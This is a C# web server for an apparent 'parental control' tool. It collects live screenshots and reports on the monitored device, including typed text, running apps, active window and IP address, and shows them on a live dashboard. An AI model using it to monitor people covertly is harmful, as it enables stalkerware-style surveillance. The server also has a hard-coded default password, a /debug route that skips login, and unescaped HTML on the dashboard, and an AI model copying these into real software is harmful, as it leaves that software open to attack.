using System.Collections.Concurrent;
using System.Text;
using Newtonsoft.Json;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

string authUsername = Environment.GetEnvironmentVariable("AUTH_USERNAME") ?? "admin";
string authPassword = Environment.GetEnvironmentVariable("AUTH_PASSWORD") ?? "Ahmed@2026!Safe";

var latestFrames = new ConcurrentDictionary<string, byte[]>();
var latestReports = new ConcurrentDictionary<string, ReportData>();
var frameTimestamps = new ConcurrentDictionary<string, long>();

app.Use(async (context, next) =>
{
    if (context.Request.Path.StartsWithSegments("/debug"))
    {
        await next();
        return;
    }

    string? authHeader = context.Request.Headers["Authorization"];
    if (authHeader != null && authHeader.StartsWith("Basic "))
    {
        try
        {
            var encoded = authHeader.Substring("Basic ".Length).Trim();
            var decoded = Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
            var sep = decoded.IndexOf(':');
            if (sep != -1)
            {
                var user = decoded.Substring(0, sep);
                var pass = decoded.Substring(sep + 1);
                if (user == authUsername && pass == authPassword)
                {
                    await next();
                    return;
                }
            }
        }
        catch { }
    }

    context.Response.Headers["WWW-Authenticate"] = "Basic realm=\"ParentalControl\"";
    context.Response.StatusCode = 401;
    await context.Response.WriteAsync("Unauthorized");
});

app.MapPost("/frame", async (HttpContext context) =>
{
    if (!context.Request.HasFormContentType)
        return Results.BadRequest("Invalid form data");

    var form = await context.Request.ReadFormAsync();
    string childId = form["child_id"].ToString();
    var file = form.Files["frame"];

    if (file == null || string.IsNullOrEmpty(childId))
        return Results.BadRequest("Missing child_id or frame");

    using var ms = new MemoryStream();
    await file.CopyToAsync(ms);
    byte[] bytes = ms.ToArray();

    latestFrames[childId] = bytes;
    frameTimestamps[childId] = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

    return Results.Ok(new { status = "ok", size = bytes.Length });
});

app.MapGet("/frame/{childId}", (string childId) =>
{
    if (!latestFrames.TryGetValue(childId, out var bytes))
        return Results.NotFound("No frame yet");

    return Results.File(bytes, "image/jpeg", enableRangeProcessing: true);
});

app.MapPost("/report", async (HttpContext context) =>
{
    using var reader = new StreamReader(context.Request.Body);
    string json = await reader.ReadToEndAsync();

    if (string.IsNullOrWhiteSpace(json))
        return Results.BadRequest("Empty body");

    var report = JsonConvert.DeserializeObject<ReportData>(json);
    if (report == null || string.IsNullOrEmpty(report.ChildId))
        return Results.BadRequest("Invalid data");

    report.ReceivedAt = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
    latestReports[report.ChildId] = report;

    return Results.Ok(new { status = "ok" });
});

app.MapGet("/children", () =>
{
    var children = latestReports.Values.Select(r => new
    {
        child_id = r.ChildId,
        last_update = r.ReceivedAt,
        active_window = r.ActiveWindow,
        ip = r.IPAddress,
        running_apps_count = r.RunningApps?.Count ?? 0,
        has_live_frame = latestFrames.ContainsKey(r.ChildId),
        last_frame_ago_ms = frameTimestamps.TryGetValue(r.ChildId, out var ts)
            ? DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() - ts
            : -1
    });
    return Results.Json(children);
});

app.MapGet("/dashboard", () =>
{
    var html = BuildDashboard();
    return Results.Content(html, "text/html; charset=utf-8");
});

app.MapGet("/", () => Results.Redirect("/dashboard"));

app.MapGet("/debug", () =>
{
    var info = new
    {
        children_count = latestReports.Count,
        frames_count = latestFrames.Count,
        children = latestReports.Keys.ToArray(),
        current_time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
    };
    return Results.Json(info);
});

var port = Environment.GetEnvironmentVariable("PORT") ?? "5000";
app.Run($"http://0.0.0.0:{port}");

static string BuildDashboard()
{
    var sb = new StringBuilder();
    sb.Append("<!DOCTYPE html>");
    sb.Append("<html lang='en'>");
    sb.Append("<head>");
    sb.Append("<meta charset='UTF-8'>");
    sb.Append("<title>Parental Control - Live</title>");
    sb.Append("<style>");
    sb.Append("body{background:#0f172a;color:#e2e8f0;padding:20px;font-family:sans-serif;}");
    sb.Append("h1{color:#60a5fa;text-align:center;}");
    sb.Append(".child-card{background:#1e293b;border-radius:16px;padding:20px;margin:20px auto;max-width:1100px;}");
    sb.Append(".child-header{display:flex;justify-content:space-between;margin-bottom:15px;padding-bottom:10px;border-bottom:1px solid #334155;}");
    sb.Append(".child-name{font-size:22px;font-weight:bold;color:#60a5fa;}");
    sb.Append(".dot{width:10px;height:10px;border-radius:50%;background:#22c55e;display:inline-block;}");
    sb.Append(".dot.offline{background:#ef4444;}");
    sb.Append(".stream-img{max-width:100%;max-height:70vh;display:block;margin:auto;}");
    sb.Append(".stream-container{background:#000;border-radius:12px;padding:10px;margin:15px 0;text-align:center;min-height:300px;}");
    sb.Append(".no-stream{color:#64748b;padding:80px 20px;}");
    sb.Append(".info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;margin-top:15px;}");
    sb.Append(".info-item{background:#0f172a;padding:12px;border-radius:8px;border-left:3px solid #60a5fa;}");
    sb.Append(".info-label{color:#94a3b8;font-size:12px;text-transform:uppercase;}");
    sb.Append(".info-value{color:#e2e8f0;font-size:15px;margin-top:4px;}");
    sb.Append("</style>");
    sb.Append("</head><body>");
    sb.Append("<h1>🎥 Parental Control - Live Stream</h1>");
    sb.Append("<div id='children'></div>");
    sb.Append("<script>");
    sb.Append("async function loadChildren(){");
    sb.Append("  const r = await fetch('/children');");
    sb.Append("  const children = await r.json();");
    sb.Append("  renderChildren(children);");
    sb.Append("}");
    sb.Append("function renderChildren(children){");
    sb.Append("  const c = document.getElementById('children');");
    sb.Append("  if(children.length === 0){");
    sb.Append("    c.innerHTML = '<div class=\"child-card\"><div class=\"no-stream\">⏳ Waiting for client...</div></div>';");
    sb.Append("    return;");
    sb.Append("  }");
    sb.Append("  let h = '';");
    sb.Append("  for(const x of children){");
    sb.Append("    const live = x.last_frame_ago_ms >= 0 && x.last_frame_ago_ms < 5000;");
    sb.Append("    h += '<div class=\"child-card\">';");
    sb.Append("    h += '<div class=\"child-header\">';");
    sb.Append("    h += '<div class=\"child-name\">👤 ' + x.child_id + '</div>';");
    sb.Append("    h += '<div><span class=\"dot ' + (live ? '' : 'offline') + '\"></span> ' + (live ? 'LIVE' : 'Offline') + '</div>';");
    sb.Append("    h += '</div>';");
    sb.Append("    h += '<div class=\"stream-container\"><img class=\"stream-img\" src=\"/frame/' + x.child_id + '?t=' + Date.now() + '\"></div>';");
    sb.Append("    h += '<div class=\"info-grid\">';");
    sb.Append("    h += '<div class=\"info-item\"><div class=\"info-label\">Active Window</div><div class=\"info-value\">' + (x.active_window || '-') + '</div></div>';");
    sb.Append("    h += '<div class=\"info-item\"><div class=\"info-label\">IP</div><div class=\"info-value\">' + (x.ip || '-') + '</div></div>';");
    sb.Append("    h += '<div class=\"info-item\"><div class=\"info-label\">Last Update</div><div class=\"info-value\">' + (x.last_update || '-') + '</div></div>';");
    sb.Append("    h += '<div class=\"info-item\"><div class=\"info-label\">Frame Age</div><div class=\"info-value\">' + (x.last_frame_ago_ms >= 0 ? x.last_frame_ago_ms + ' ms' : 'No frames') + '</div></div>';");
    sb.Append("    h += '</div></div>';");
    sb.Append("  }");
    sb.Append("  c.innerHTML = h;");
    sb.Append("}");
    sb.Append("function refresh(){");
    sb.Append("  document.querySelectorAll('.stream-img').forEach(i => {");
    sb.Append("    i.src = i.src.split('?')[0] + '?t=' + Date.now();");
    sb.Append("  });");
    sb.Append("}");
    sb.Append("loadChildren();");
    sb.Append("setInterval(refresh, 500);");
    sb.Append("setInterval(loadChildren, 3000);");
    sb.Append("</script></body></html>");
    return sb.ToString();
}

public class ReportData
{
    [JsonProperty("child_id")] public string ChildId { get; set; } = "";
    [JsonProperty("timestamp")] public string Timestamp { get; set; } = "";
    [JsonProperty("active_window")] public string ActiveWindow { get; set; } = "";
    [JsonProperty("running_apps")] public List<string> RunningApps { get; set; } = new();
    [JsonProperty("typed_text")] public string TypedText { get; set; } = "";
    [JsonProperty("ip")] public string IPAddress { get; set; } = "";
    [JsonProperty("received_at")] public string ReceivedAt { get; set; } = "";
}